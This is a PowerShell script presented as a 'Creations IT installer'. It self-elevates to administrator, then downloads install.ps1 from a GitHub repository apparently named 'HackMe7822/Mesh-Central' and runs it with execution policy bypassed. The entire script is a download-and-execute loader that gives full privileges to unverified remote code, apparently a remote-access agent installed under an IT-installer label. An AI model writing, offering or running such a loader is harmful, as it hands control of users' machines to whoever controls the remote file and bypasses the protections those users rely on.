if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    $path = if ($PSCommandPath) { $PSCommandPath } else { $MyInvocation.MyCommand.Path }
    Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -File `"$path`"" -Verb RunAs
    exit
}

try {
    Write-Host "Downloading Creations IT installer..." -ForegroundColor Cyan
    $u = (Invoke-WebRequest "https://api.github.com/repos/HackMe7822/Mesh-Central/contents/install.ps1" -UseBasicParsing | ConvertFrom-Json).download_url
    Invoke-WebRequest $u -OutFile "C:\deploy.ps1" -UseBasicParsing
    powershell -ExecutionPolicy Bypass -File "C:\deploy.ps1"
} catch {
    Write-Host ""
    Write-Host "ERROR: $($_.Exception.Message)" -ForegroundColor Red
}

Read-Host "Press Enter to close"
